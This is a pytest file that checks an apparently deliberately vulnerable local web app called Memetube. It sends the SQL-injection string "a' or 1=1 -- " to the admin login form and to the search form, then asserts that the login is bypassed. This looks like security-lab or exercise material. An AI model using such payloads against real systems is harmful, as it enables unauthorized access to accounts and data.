import pytest
import requests
import urllib3
try:
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    # surpress Unverified HTTPS request warning, due to self signed cert
except Exception as e:
    print(f'An exception has occurred while disabling warnings: {e}')


def test_helloworld():
    # Basic pytest for act1 to determine if travis is working
    resp = requests.get('https://127.0.0.1', verify=False)
    assert 'SIGN-IN HERE' in resp.text
    assert 200 == resp.status_code


def test_login_sqli():
    user = "a' or 1=1 -- "
    password = ""
    data = {
        'user': user,
        'pass': password,
        'submit': 'Log-In'
    }
    login_url = 'https://127.0.0.1/adminlogin.php'
    resp = requests.post(login_url, data=data, verify=False)
    # login with created user
    print('test_login: ', resp.text)
    assert 200 == resp.status_code
    assert "Welcome to Memetube" in resp.text
    # we are in the memetrix


def test_search_sqli():
    sqli = "a' or 1=1 -- "
    data = {
        'search': sqli,
        'submit': 'Search'
    }
    login_url = 'https://127.0.0.1/search.php'
    resp = requests.post(login_url, data=data, verify=False)

    assert 200 == resp.status_code
    # we are in the memetrix


if __name__ == '__main__':
    pytest.main()
